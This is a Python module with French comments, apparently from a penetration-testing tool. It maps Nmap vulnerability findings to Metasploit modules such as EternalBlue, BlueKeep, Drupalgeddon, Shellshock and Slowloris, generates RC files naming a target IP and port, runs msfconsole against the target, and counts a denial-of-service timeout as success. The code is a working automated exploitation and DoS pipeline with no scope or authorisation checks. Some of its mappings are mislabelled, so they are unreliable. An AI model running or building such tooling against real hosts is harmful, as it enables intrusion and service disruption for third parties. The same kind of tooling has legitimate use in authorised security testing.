import os
import subprocess
import json
from datetime import datetime
from utils.logger import get_logger
import re

# Configuration du logger
logger = get_logger('metasploit_auto')

# Table de correspondance vulnérabilités ➜ modules Metasploit
EXPLOIT_MAP = {
    # FTP
    "ftp-vsftpd-backdoor": "exploit/unix/ftp/vsftpd_234_backdoor",
    "ftp-proftpd-backdoor": "exploit/unix/ftp/proftpd_133c_backdoor",
    
    # Web / HTTP
    "http-slowloris-check": "auxiliary/dos/http/slowloris",  # Slowloris DoS
    "http-slowloris": "auxiliary/dos/http/slowloris",
    "http-vuln-cve2014-3704": "exploit/unix/webapp/drupal_drupalgeddon",  # Drupalgeddon
    "http-vuln-cve2017-1001000": "exploit/multi/http/struts_code_exec_classloader",
    "http-vuln-cve2014-6271": "exploit/multi/http/apache_mod_cgi_bash_env_exec",  # Shellshock
    "http-vuln-cve2019-0708": "exploit/windows/rdp/cve_2019_0708_bluekeep_rce",  # BlueKeep
    "http-shellshock": "exploit/multi/http/apache_mod_cgi_bash_env_exec",
    
    # SMB
    "smb-vuln-ms17-010": "exploit/windows/smb/ms17_010_eternalblue",  # EternalBlue
    "smb-vuln-ms08-067": "exploit/windows/smb/ms08_067_netapi",
    
    # SSH
    "ssh-auth-bypass": "exploit/unix/ssh/libssh_auth_bypass",
    
    # SSL/TLS
    "ssl-heartbleed": "auxiliary/scanner/ssl/openssl_heartbleed",
    "ssl-ccs-injection": "auxiliary/scanner/ssl/openssl_ccs",     # CCS Injection (CVE-2014-0224)
    "ssl-poodle": "auxiliary/scanner/ssl/openssl_fallback_check", # POODLE
    "ssl-drown": "auxiliary/scanner/ssl/openssl_drown",           # DROWN
    "ssl-dh-params": "auxiliary/scanner/ssl/ssl_version",         # Paramètres DH faibles
    
    # Autres
    "ms-sql-empty-password": "exploit/windows/mssql/mssql_payload",
    
    # Ajout des vulnérabilités génériques par CVE
    "cve-2014-0224": "auxiliary/scanner/ssl/openssl_ccs",          # CCS Injection
    "cve-2014-0160": "auxiliary/scanner/ssl/openssl_heartbleed",   # Heartbleed
    "cve-2015-4000": "auxiliary/scanner/ssl/openssl_logjam",       # Logjam
    "cve-2016-2107": "auxiliary/scanner/ssl/openssl_aes_ni",       # Sweet32
    "cve-2014-3704": "exploit/unix/webapp/drupal_drupalgeddon"     # Drupalgeddon
}

# Répertoire pour les rapports d'exploitation
EXPLOITS_DIR = "exploit_reports"
os.makedirs(EXPLOITS_DIR, exist_ok=True)

def map_vuln_to_metasploit(vuln_name):
    """
    Tente de mapper un nom de vulnérabilité Nmap à un module Metasploit
    """
    # Correspondance directe
    if vuln_name in EXPLOIT_MAP:
        return EXPLOIT_MAP[vuln_name]
    
    # Correspondance par regex pour les CVE
    cve_match = re.search(r'cve-?(\d{4})-(\d+)', vuln_name.lower())
    if cve_match:
        cve_year = cve_match.group(1)
        cve_id = cve_match.group(2)
        
        # Rechercher dans la table des exploits par CVE
        for key, value in EXPLOIT_MAP.items():
            if f"cve{cve_year}_{cve_id}" in value.lower() or f"cve_{cve_year}_{cve_id}" in value.lower():
                return value
    
    # Recherche par mots-clés dans le nom de la vulnérabilité
    keywords = [
        "slowloris", "heartbleed", "shellshock", "poodle", "drown", 
        "eternalblue", "bluekeeper", "drupal", "struts", "bash", "logjam"
    ]
    
    for keyword in keywords:
        if keyword in vuln_name.lower():
            # Chercher dans EXPLOIT_MAP les entrées contenant ce mot-clé
            for key, value in EXPLOIT_MAP.items():
                if keyword in key.lower():
                    return value
    
    return None

def create_rc_file(metasploit_module, target_ip, target_port, options=None):
    """
    Génère un fichier RC temporaire pour l'exploit
    
    Args:
        metasploit_module (str): Module Metasploit à utiliser
        target_ip (str): Adresse IP cible
        target_port (str/int): Port cible
        options (dict): Options supplémentaires pour le module
    
    Returns:
        str: Chemin vers le fichier RC généré
    """
    logger.info(f"Création du fichier RC pour le module {metasploit_module}")
    
    # Contenu de base du fichier RC
    rc_content = f"""
use {metasploit_module}
set RHOSTS {target_ip}
set RPORT {target_port}
"""
    
    # Ajouter les options supplémentaires si fournies
    if options:
        for option, value in options.items():
            rc_content += f"set {option} {value}\n"
    
    # Ajouter la commande d'exploitation et la sortie
    is_dos_module = "dos" in metasploit_module.lower() or "slowloris" in metasploit_module.lower()
    
    if metasploit_module.startswith("auxiliary"):
        if is_dos_module:
            # Pour les modules DoS, exécuter en arrière-plan
            rc_content += "run -j\n"
        else:
            rc_content += "run\n"
    else:
        rc_content += "exploit -z\n"  # -z pour ne pas interagir avec la session
    
    # Créer le répertoire si nécessaire
    os.makedirs("scripts", exist_ok=True)
    
    # Générer un nom de fichier unique
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    rc_path = f"scripts/exploit_{timestamp}.rc"
    
    # Écrire le fichier RC
    with open(rc_path, "w") as f:
        f.write(rc_content)
    
    logger.debug(f"Fichier RC créé: {rc_path}")
    logger.debug(f"Contenu du fichier RC:\n{rc_content}")
    
    return rc_path

def run_metasploit_auto(vuln_data, custom_options=None):
    """
    Exécute automatiquement un exploit Metasploit
    
    Args:
        vuln_data (dict): Données de la vulnérabilité (id, ip, port, etc.)
        custom_options (dict): Options supplémentaires pour le module
    
    Returns:
        dict: Résultat de l'exploitation
    """
    vuln_id = vuln_data.get("vuln_id") or vuln_data.get("vulnerability")
    ip = vuln_data.get("ip") or vuln_data.get("target")
    port = vuln_data.get("port")
    manual_module = vuln_data.get("manual_module")
    
    logger.info(f"Tentative d'exploitation automatique: {vuln_id} sur {ip}:{port}")
    
    # Vérifier que toutes les informations nécessaires sont présentes
    if not vuln_id or not ip or not port:
        logger.error("Informations manquantes pour l'exploitation")
        return {
            "success": False,
            "error": "Données incomplètes. vuln_id, ip et port sont requis.",
            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        }
    
    # Vérifier si un module a été spécifié manuellement
    if manual_module:
        module = manual_module
        logger.info(f"Utilisation du module spécifié manuellement: {module}")
    else:
        # Mapper la vulnérabilité à un module Metasploit
        module = map_vuln_to_metasploit(vuln_id)
        if not module:
            logger.warning(f"Aucun module Metasploit mappé pour la vulnérabilité: {vuln_id}")
            
            # Essayer d'utiliser un module générique basé sur le service
            if port == "443" or int(port) == 443 or "ssl" in vuln_id.lower() or "tls" in vuln_id.lower():
                module = "auxiliary/scanner/ssl/openssl_ccs"
                logger.info(f"Utilisation d'un module générique pour SSL/TLS: {module}")
            elif port == "80" or int(port) == 80 or int(port) == 8080 or "http" in vuln_id.lower():
                module = "auxiliary/scanner/http/http_version"
                logger.info(f"Utilisation d'un module générique pour HTTP: {module}")
            else:
                # Si aucun module n'est trouvé et que nous ne pouvons pas deviner, demander à l'utilisateur
                return {
                    "success": False,
                    "error": f"Aucun module Metasploit mappé pour la vulnérabilité: {vuln_id}. Veuillez spécifier manuellement un module.",
                    "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                    "require_manual_module": True  # Indique qu'un module manuel est nécessaire
                }
    
    # Options par défaut
    options = custom_options or {}
    
    # Ajouter des options supplémentaires basées sur le type de vulnérabilité
    if "slowloris" in vuln_id.lower():
        options.setdefault("TIMEOUT", 500)  # Timeout pour Slowloris
        options.setdefault("DELAY", 15)     # Délai entre les requêtes
    elif "heartbleed" in vuln_id.lower():
        options.setdefault("VERBOSE", True)   # Verbosité
    elif "poodle" in vuln_id.lower():
        options.setdefault("VERBOSE", True)   # Verbosité
    
    # Créer le fichier RC
    try:
        rc_file = create_rc_file(module, ip, port, options)
    except Exception as e:
        logger.error(f"Erreur lors de la création du fichier RC: {e}", exc_info=True)
        return {
            "success": False,
            "error": f"Erreur lors de la création du fichier RC: {str(e)}",
            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        }
    
    # Exécuter Metasploit
    try:
        # Déterminer si ce module est de type DoS ou pourrait prendre plus de temps
        is_dos_module = "dos" in module.lower() or "slowloris" in module.lower()
        
        # Définir un timeout adapté au type de module
        if is_dos_module:
            timeout_value = 600  # 10 minutes pour les modules DoS
        else:
            timeout_value = 180  # 3 minutes pour les autres modules
            
        logger.info(f"Exécution de msfconsole avec le fichier RC: {rc_file} (timeout: {timeout_value}s)")
        
        output = subprocess.check_output(
            ["msfconsole", "-q", "-r", rc_file], 
            stderr=subprocess.STDOUT, 
            text=True,
            timeout=timeout_value
        )
        
        # Générer un rapport d'exploitation
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        report_file = f"{EXPLOITS_DIR}/exploit_report_{timestamp}.json"
        
        report_data = {
            "vulnerability": vuln_id,
            "target": ip,
            "port": port,
            "module": module,
            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "output": output,
            "success": "failed" not in output.lower() and "error" not in output.lower(),
            "options": options
        }
        
        with open(report_file, "w") as f:
            json.dump(report_data, f, indent=4)
        
        # Déterminer si l'exploitation a réussi
        success = "failed" not in output.lower() and "error" not in output.lower() and "session" in output.lower()
        status = "Réussi" if success else "Échec"
        
        logger.info(f"Exploitation {status}: {vuln_id} sur {ip}:{port}")
        logger.debug(f"Rapport sauvegardé: {report_file}")
        
        return {
            "success": success,
            "output": output,
            "module": module,
            "report_file": report_file,
            "status": status,
            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        }
        
    except subprocess.TimeoutExpired:
        # Vérifier si c'est un module DoS
        is_dos_module = "dos" in module.lower() or "slowloris" in module.lower() or "ddos" in module.lower()
        
        if is_dos_module:
            # Pour les modules DoS, un timeout peut être considéré comme un succès
            logger.info(f"Module DoS en cours d'exécution (timeout atteint pour {vuln_id} sur {ip}:{port})")
            
            # Générer un rapport même en cas de timeout pour les modules DoS
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            report_file = f"{EXPLOITS_DIR}/exploit_report_{timestamp}.json"
            
            report_data = {
                "vulnerability": vuln_id,
                "target": ip,
                "port": port,
                "module": module,
                "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                "output": "Exécution prolongée du module DoS - l'attaque est probablement active.",
                "success": True,  # Considérer comme un succès pour les DoS
                "options": options,
                "timeout_occurred": True
            }
            
            with open(report_file, "w") as f:
                json.dump(report_data, f, indent=4)
            
            return {
                "success": True,
                "output": "Le module DoS s'exécute plus longtemps que la durée maximale définie, ce qui peut indiquer que l'attaque fonctionne.",
                "module": module,
                "report_file": report_file,
                "status": "En cours (timeout)",
                "is_dos": True,
                "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            }
        else:
            # Pour les autres modules, un timeout est une erreur
            logger.error(f"Timeout lors de l'exécution de Metasploit pour {vuln_id} sur {ip}:{port}")
            return {
                "success": False, 
                "error": "Timeout lors de l'exécution de Metasploit",
                "timeout_duration": "10 minutes" if is_dos_module else "3 minutes",
                "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            }
    except subprocess.CalledProcessError as e:
        logger.error(f"Erreur d'exécution Metasploit: {e.output}", exc_info=True)
        return {
            "success": False,
            "error": f"Erreur d'exécution Metasploit: {e.output}",
            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        }
    except Exception as e:
        logger.error(f"Erreur inattendue: {str(e)}", exc_info=True)
        return {
            "success": False,
            "error": f"Erreur inattendue: {str(e)}",
            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        }

def check_metasploit_available():
    """
    Vérifie si Metasploit est disponible sur le système
    
    Returns:
        bool: True si Metasploit est disponible, False sinon
    """
    try:
        subprocess.run(["msfconsole", "-v"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=5)
        logger.info("Metasploit est disponible sur le système")
        return True
    except (subprocess.SubprocessError, FileNotFoundError):
        logger.warning("Metasploit n'est pas disponible sur le système")
        return False

def get_exploit_report(report_file):
    """
    Récupère un rapport d'exploitation
    
    Args:
        report_file (str): Chemin vers le fichier de rapport
    
    Returns:
        dict: Contenu du rapport
    """
    try:
        with open(report_file, "r") as f:
            return json.load(f)
    except Exception as e:
        logger.error(f"Erreur lors de la lecture du rapport: {e}", exc_info=True)
        return {"error": f"Erreur lors de la lecture du rapport: {str(e)}"}

def list_exploit_reports():
    """
    Liste tous les rapports d'exploitation disponibles
    
    Returns:
        list: Liste des rapports disponibles
    """
    reports = []
    
    if not os.path.exists(EXPLOITS_DIR):
        return reports
    
    for file in os.listdir(EXPLOITS_DIR):
        if file.endswith(".json") and file.startswith("exploit_report_"):
            try:
                with open(os.path.join(EXPLOITS_DIR, file), "r") as f:
                    data = json.load(f)
                    reports.append({
                        "filename": file,
                        "vulnerability": data.get("vulnerability", "Inconnue"),
                        "target": data.get("target", "Inconnue"),
                        "timestamp": data.get("timestamp", "Inconnue"),
                        "success": data.get("success", False)
                    })
            except Exception as e:
                logger.error(f"Erreur lors de la lecture du rapport {file}: {e}")
    
    # Trier par date (plus récent en premier)
    reports.sort(key=lambda x: x.get("timestamp", ""), reverse=True)
    
    return reports
